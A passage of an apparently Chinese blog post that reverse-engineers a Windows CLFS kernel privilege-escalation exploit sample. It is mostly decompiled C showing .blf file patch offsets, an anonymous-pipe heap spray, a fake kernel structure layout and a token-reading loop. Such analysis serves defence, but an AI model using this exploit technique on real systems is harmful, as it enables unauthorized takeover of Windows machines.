style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetFilePointer</span>(v7,<span style="color:#ae81ff">0x1DF8</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(v7,<span style="color:#f92672">&amp;</span>Buffer,<span style="color:#ae81ff">4u</span>, NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E775CF</span>(<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#e6db74">L</span><span style="color:#e6db74">"Error</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n"</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v7);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0x800</span>i64,<span style="color:#ae81ff">0x7A00</span>i64);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v13);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0x8200</span>i64,<span style="color:#ae81ff">0x7A00</span>i64);</span></span><span style="display:flex;"><span> dword_7FF662B449B8<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)NumberOfBytesWritten<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">0x7A00</span>,<span style="color:#e6db74">"Clfs"</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>i64);<span style="color:#75715e">// 查询堆内信息</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v14<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);<span style="color:#75715e">// LOG:C:\\\\Users\\\\Public\\\\MyLog_%08d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">0x7A00</span>,<span style="color:#e6db74">"Clfs"</span>,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span><span style="color:#f92672">*</span>)NumberOfBytesWritten);<span style="color:#75715e">// NumberOfBytesWritten 指向了最后一个clfs池，也就是最后一个clfs 基本块的地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!*</span>(_QWORD<span style="color:#f92672">*</span>)NumberOfBytesWritten )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"pause"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> MyLog__08d_base_block<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)NumberOfBytesWritten;</span></span><span style="display:flex;"><span> hLog<span style="color:#f92672">=</span> v14;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">::</span>pszLogFileName, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"%s"</span>, pszLogFileName);</span></span><span style="display:flex;"><span> pcbContainer[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">512</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ((<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">*</span>)(HANDLE, ULONGLONG<span style="color:#f92672">*</span>, WCHAR<span style="color:#f92672">*</span>, _QWORD))AddLogContainer)(</span></span><span style="display:flex;"><span> hLog,</span></span><span style="display:flex;"><span> pcbContainer,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>pwszContainerPath,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>之后通过CreateLogFile创建10个日志文件，并修改以下偏移，这里将其称之为副blf文件。</p><pre tabindex="0"><code>读取0-0x400到缓冲区并将以下偏移的值修改
0x70 -> 0 4字节
0x06 -> 2 4字节
而后将这个缓冲区写入到偏移0x400处
0x06 -> 0x1 4字节
0x0c -> crc32 4字节
0x70 -> 0x2 4字节
0x84 -> 0x2 4字节
0x88 -> 0x4 4字节
0x8A -> 0x4 4字节
0x90 -> 0x1 4字节
0x94 -> 0x3 4字节
0x9C -> 0x2 4字节
0x406 -> 2 4字节
0x40c -> crc32
0x470 -> 0 4字节
0x484 -> 0x2 4字节
0x488 -> 0x13 4字节
0x48A -> 0x13 4字节
0x1B98 -> 0x65C8
0x80c -> crc32
0x820c -> crc32
0x9598 -> 0x65C8</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">fun_tigger</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span>a1,<span style="color:#66d9ef">__int64</span> a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> DWORD NumberOfBytesWritten;<span style="color:#75715e">// [rsp+44h] [rbp-14h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7B416</span>(a2);</span></span><span style="display:flex;"><span> LogFile<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(a1,<span style="color:#ae81ff">0xC0000000</span>,<span style="color:#ae81ff">1u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);<span style="color:#75715e">// LOG:C:\\\\Users\\\\Public\\\\MyLog%d%08d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( LogFile<span style="color:#f92672">==</span> (HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>i64 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(LogFile);</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x400u</span>i64);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>(a2,<span style="color:#ae81ff">0x800</span>,<span style="color:#ae81ff">0x7A00u</span>);</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">CreateFilew</span>(a2,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">7</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetFilePointer</span>(v19,<span style="color:#ae81ff">0x9598</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(v19,<span style="color:#f92672">&amp;</span>Buffer,<span style="color:#ae81ff">4u</span>,<span style="color:#f92672">&amp;</span>NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E775CF</span>(<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#e6db74">L</span><span style="color:#e6db74">"Error</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n"</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v19);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>(a2,<span style="color:#ae81ff">0x8200</span>,<span style="color:#ae81ff">0x7A00u</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">free</span>(v5);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>使用匿名管道进行堆布局，通过调用func_pipespray并两次分别传入0x5000和0x4000来申请0x5000对和0x4000对匿名pipe，</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE<span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">func_pipespray</span>(<span style="color:#66d9ef">int</span> a1)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> v2;<span style="color:#75715e">// of</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">size_t</span> v3;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> HANDLE<span style="color:#f92672">*</span>v4;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v6;<span style="color:#75715e">// esi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v2<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)a1<span style="color:#f92672">>></span><span style="color:#ae81ff">28</span><span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(<span style="color:#ae81ff">16</span><span style="color:#f92672">*</span> a1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v2 )</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> (HANDLE<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(v3);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v4 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v5)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a1<span style="color:#f92672">></span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">CreatePipe</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v4[v6], (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v4[v6<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0x60</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)v5;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)v5<span style="color:#f92672">></span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>v4);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v4[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v5;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v5 );</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">JUMPOUT</span>(<span style="color:#ae81ff">0x7FF662B227AE</span>i64);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v5)<span style="color:#f92672">=</span> v5<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">int</span>)v5<span style="color:#f92672">&lt;</span> a1 );</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v4;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>首先遍历0x5000对pipe的pipe_array_a，并通过WriteFile写入长度为12的指针数组，其内容为第一个日志文件的base block。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Buffer[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">9</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">11</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64; j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x5000</span>;<span style="color:#f92672">++</span>j )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(<span style="color:#f92672">*</span>v46, Buffer,<span style="color:#ae81ff">0x60u</span>,<span style="color:#f92672">&amp;</span>NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>pipe_array_a);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(pipe_array_a[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> pipe_array_a<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v42;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v42 );</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">JUMPOUT</span>(<span style="color:#ae81ff">0x7FF662B243B7</span>i64);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v46<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而后从第0x1000对开始，释放0x667对pipe，释放结束后创建日志文件对释放后的内存进行占位</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64; j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x5000</span>;<span style="color:#f92672">++</span>j )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(<span style="color:#f92672">*</span>v46, Buffer,<span style="color:#ae81ff">0x60u</span>,<span style="color:#f92672">&amp;</span>NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>pipe_array_a);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(pipe_array_a[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> pipe_array_a<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v42;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v42 );</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">JUMPOUT</span>(<span style="color:#ae81ff">0x7FF662B243B7</span>i64);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v46<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v48<span style="color:#f92672">=</span> pipe_array_a<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2000</span>;</span></span><span style="display:flex;"><span> v49<span style="color:#f92672">=</span><span style="color:#ae81ff">0x667</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>v48);<span style="color:#75715e">// 释放Pipe</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">CloseHandle</span>(v48[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> v48<span style="color:#f92672">+=</span><span style="color:#ae81ff">10</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v49;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v49 );</span></span><span style="display:flex;"><span> v50<span style="color:#f92672">=</span><span style="color:#ae81ff">0xA</span>i64;</span></span><span style="display:flex;"><span> v51<span style="color:#f92672">=</span> hObject;</span></span><span style="display:flex;"><span> v52<span style="color:#f92672">=</span><span style="color:#ae81ff">0xA</span>i64;</span></span><span style="display:flex;"><span> v53<span style="color:#f92672">=</span> pszLogFileName;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> LogFile<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(v53,<span style="color:#ae81ff">0xC0000000</span>,<span style="color:#ae81ff">1u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v53<span style="color:#f92672">+=</span><span style="color:#ae81ff">256</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v51<span style="color:#f92672">++</span><span style="color:#f92672">=</span> LogFile;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v52;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v52 );</span></span></code></pre></div><p>占位结束后，对第二次申请的0x4000对pipe_array_b调用WriteFile写入指针数组，而后对0x5000030处内存进行布局，循环尝试触发漏洞，首先为创建的10个副blf文件添加log container，在每次添加容器之后，通过CreateLogFile打开主blf文件的句柄（第一个创建的日志文件。）而后尝试通过NtFsControlFileAddress函数读取token，在读取之后判断token有效性，有效则退出循环。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(<span style="color:#f92672">*</span>v56, Buffer,<span style="color:#ae81ff">0x60u</span>,<span style="color:#f92672">&amp;</span>v87,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>pipe_array_b);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(pipe_array_b[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> pipe_array_b<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v43;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v43 );</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v55;</span></span><span style="display:flex;"><span> v56<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v55<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x4000</span> );</span></span><span style="display:flex;"><span> pcbContainer<span style="color:#f92672">=</span><span style="color:#ae81ff">512</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( versionFlag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v57<span style="color:#f92672">=</span> Size;</span></span><span style="display:flex;"><span> v58<span style="color:#f92672">=</span> hObject;</span></span><span style="display:flex;"><span> v59<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AddLogContainer</span>(<span style="color:#f92672">*</span>v58,<span style="color:#f92672">&amp;</span>pcbContainer, (LPWSTR)<span style="color:#f92672">&amp;</span>v97[<span style="color:#ae81ff">256</span><span style="color:#f92672">*</span> (<span style="color:#66d9ef">__int64</span>)v59],<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000030</span>]<span style="color:#f92672">=</span> qword_7FF662B44710;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000000</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x5001000</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001000</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001010</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001018</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001008</span>]<span style="color:#f92672">=</span> PoFxProcessorNotificationKernelAddress1;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000040</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">83886080</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000068</span>]<span style="color:#f92672">=</span> ClfsMgmtDeregisterManagedClientAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000048</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">83887104</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000400</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">83890944</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000448</span>]<span style="color:#f92672">=</span> ntap_address<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001328</span>]<span style="color:#f92672">=</span> 